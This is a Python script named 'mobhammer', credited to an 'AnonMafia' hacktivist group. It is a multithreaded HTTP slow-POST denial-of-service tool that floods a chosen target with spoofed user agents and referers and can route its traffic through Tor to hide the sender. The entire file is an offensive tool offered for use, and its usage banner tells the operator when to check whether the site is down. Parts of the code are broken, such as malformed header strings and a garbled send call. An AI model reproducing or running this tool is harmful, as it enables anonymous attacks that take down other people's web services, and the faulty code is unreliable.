#!/usr/bin/python
#AnonMafia Cyber Family
#Mobhammer uses HULK-DOS, ARME-DOS, and HOIC features
#(PLEASE USE TOR (-T When running))
#Coded By: M4STER T3MPER

"""
#AnonMafia Cyber Family
#Mobhammer uses HULK-DOS, ARME-DOS, and HOIC features
#(PLEASE USE TOR (-T When running))
#Coded By: M4STER T3MPER

"""

import os
import re
import time
import sys
import random
import math
import getopt
import socks
import string
import terminal

from threading import Thread

global stop_now
global term

stop_now = False
term = terminal.TerminalController()

useragents = [
"Baiduspider+(+http://www.baidu.com/search/spider.htm)",
 "Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
 "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
 "Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0;  http://www.beslist.nl/",
 "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
 "zspider/0.9-dev http://feedback.redkolibri.com/",
 "Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)",
 "Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )",
 "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",
 "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)",
 "Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",
 "TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)",
 "TheSuBot/0.2 (www.thesubot.de)",
 "TheSuBot/0.1 (www.thesubot.de)",
 "FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
 "FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
 "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
 "FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
 "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
 "FAST-WebCrawler/3.x Multimedia",
 "Mozilla/4.0 (compatible: FDSE robot)",
 "findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
 "Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable",
 "Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable",
 "Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2",
 "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3",
 "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
 "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
 "AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)"
 "AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
 "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
 "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
 "AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
 "AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
 "AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
 "AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
 "AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
 "AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
 "AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
 "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
 "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
 "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
 "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
 "MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
 "Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)",
 "MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)",
 "Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0",
 "Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)",
 "msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
 "msnbot/0.9 (+http://search.msn.com/msnbot.htm)",
 "msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
 "MSNBOT/0.1 (http://search.msn.com/msnbot.htm)",
 "Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)",
 "Mozilla/5.0 (compatible; mxbot/1.0;  http://www.chainn.com/mxbot.html)",
 "NetResearchServer/4.0(loopimprovements.com/robot.html)",
 "NetResearchServer/3.5(loopimprovements.com/robot.html)",
 "NetResearchServer/2.8(loopimprovements.com/robot.html)",
 "NetResearchServer/2.7(loopimprovements.com/robot.html)",
 "NetResearchServer/2.5(loopimprovements.com/robot.html)",
 "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)",
 "Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET ",
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
 "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0",
]

def referer_list():
	global headers_referers
	headers_referers.append('https://duckduckgo.com/?q=we+are+anonymous')
	headers_referers.append('https://duckduckgo.com/?q=we+are+legion')
	headers_referers.append('https://duckduckgo.com/?q=we+do+not+forgive')
	headers_referers.append('https://duckduckgo.com/?q=we+do+not+forget')
	headers_referers.append('https://duckduckgo.com/?q=expect+us')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)

def headers_list():
	global random_headers
	random_headers.append('Sat, 29 Oct 1994 11:59:59 GMT')
	random_headers.append('Tue, 18 Sep 2002 10:34:27 GMT')
	random_headers.append('Mon, 12 Aug 2004 12:54:49 GMT')
	random_headers.append('Wed, 30 Jan 2000 01:21:09 GMT')
	random_headers.append('Tue, 18 Aug 2006 08:49:15 GMT')
	random_headers.append('Fri, 20 Oct 2006 09:34:27 GMT')
	random_headers.append('Mon, 29 Oct 2001 05:17:09 GMT')
	random_headers.append('Tue, 18 Apr 2003 12:54:49 GMT')
	random_headers.append('Sat, 18 Aug 2002 12:54:49 GMT')
	random_headers.append('Wed, 30 Jan 2000 01:21:09 GMT')
	random_headers.append('Tue, 18 Aug 2009 08:49:15 GMT')
	random_headers.append('Fri, 20 Jun 2006 09:34:27 GMT')
	random_headers.append('Sun, 13 Oct 2007 11:59:59 GMT')
	random_headers.append('Tue, 18 Aug 2003 12:54:49 GMT')
	random_headers.append('Wed, 30 Jan 2002 01:21:09 GMT')
	random_headers.append('Tue, 18 Aug 2009 08:49:15 GMT')
	random_headers.append('Fri, 20 Oct 2008 09:34:27 GMT')
	random_headers.append('Mon, 29 Oct 2007 11:59:59 GMT')
	random_headers.append('Tue, 18 Aug 2001 12:54:49 GMT')
	random_headers.append('Sat, 18 Aug 2012 12:44:48 GMT')
	random_headers.append('Wed, 30 Jan 2000 01:21:09 GMT')
	random_headers.append('Tue, 18 Aug 2009 08:49:15 GMT')
	random_headers.append('Sun, 01 Jan 2012 12:04:31 GMT')
	random_headers.append('Thu, 05 Jan 2012 11:19:43 GMT')
	random_headers.append('Sat, 29 Oct 1994 11:59:59 GMT')
	random_headers.append('Thu, 17 May 2012 06:54:49 GMT')
	random_headers.append('Sun, 06 May 2012 12:19:27 GMT')
	return(random_headers)

def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

class httpPost(Thread):
    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True
		
    def _send_http_post(self, pause = random.randint(5 ,10)):
        global stop_now

        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Cache-Control: no-cache, max-age=0\r\n"
                        "Accept-Encoding: gzip, deflate, compress"
                        "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
                        "Referer: random.choice(headers_referers) + buildblock(random.randint(5,10)))"
                        "Accept-Datetime: random.choice(random_headers) + buildblock(random.randint(5,10)))"
                        "Range: bytes=0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-"
                        "Connection: keep-alive\r\n"
                        "Keep-Alive: 9009\r\n"
                        "Content-Length: 20000\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
                        (self.host, random.choice(useragents)))

        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            data = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0''!','@','#','$','%','^','&','*','(',')','-','_','"', ';','NULL','null''\x00','0xFFFFFFFF']
            p = random.choice(data)
            counts = [p,p*2,p*3,p*4,p*5,p*6,p*7,p*8,p*9,p*10]
            count = random.choice(counts)
            print term.BOL+term.UP+term.CLEAR_EOL+"Posting data string: %s" % count+term.NORMAL
            self.socks.send(count)(buildblock)(random.randint(3,10)) + '=' + (buildblock)(random.randint(3,10))
            time.sleep(random.uniform(0.1, 3))
	
        self.socks.close()
		
    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:     
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9450)
                    self.socks.connect((self.host, self.port))
                    print term.BOL+term.UP+term.CLEAR_EOL+"C0NNEC7ING T0 TARG3T..."+ term.NORMAL
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"ERR0R C0NN3CTING T0 T0R 0R TARG3T..."+ term.NORMAL
                    time.sleep(1)
                    continue
	
            while self.running:
                try:
                    self._send_http_post()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print term.BOL+term.UP+term.CLEAR_EOL+"THR3AD DAMAG3D, RES7ARTING..."+ term.NORMAL
                        self.socks = socks.socksocket()
                        break
                    time.sleep(0.1)
                    pass
 
def usage():
    print "./mobhammer.py -t <target> [-r <threads> -p <port> -T -h]"
    print " -t|--target <Hostname|IP>"
    print " -r|--threads <Number of threads> Defaults to 356"
    print " -p|--port <Web Server Port> Defaults to 80"
    print " -T|--tor Enable anonymising through tor on 127.0.0.1:9050"
    print " -h|--help Shows this help\n" 
    print "Eg. ./mobhammer.py -t 192.168.1.100 -r 356 -T\n"

def main(argv):
    
    try:
        opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
    except getopt.GetoptError:
        usage() 
        sys.exit(-1)

    global stop_now
	
    target = ''
    threads = 256
    tor = False
    port = 80

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit(0)
        if o in ("-T", "--tor"):
            tor = True
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-r", "--threads"):
            threads = int(a)
        elif o in ("-p", "--port"):
            port = int(a)

    if target == '' or int(threads) <= 0:
        usage()
        sys.exit(-1)

    print term.DOWN + term.RED + "/*" + term.NORMAL
    print term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL
    print term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL
    print term.RED + " * Give 30 seconds without tor and 2 mins with tor before checking site" + term.NORMAL
    print term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL

    rthreads = []
    for i in range(threads):
        t = httpPost(target, port, tor)
        rthreads.append(t)
        t.start()

    while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
        except KeyboardInterrupt:
            print "\nShutting down threads...\n"
            for t in rthreads:
                stop_now = True
                t.running = False

if __name__ == "__main__":
    print "\n/*"
    print " *"+term.GREEN + " AnonMafia Cyber Family: priv8 torshammer source "+term.NORMAL
    print " * We are Anonymous."
    print " * We are Legion."
    print " * We do not Forgive."
    print " * We do not Forget."
    print " * Expect us."
    print " */\n"

    main(sys.argv[1:])

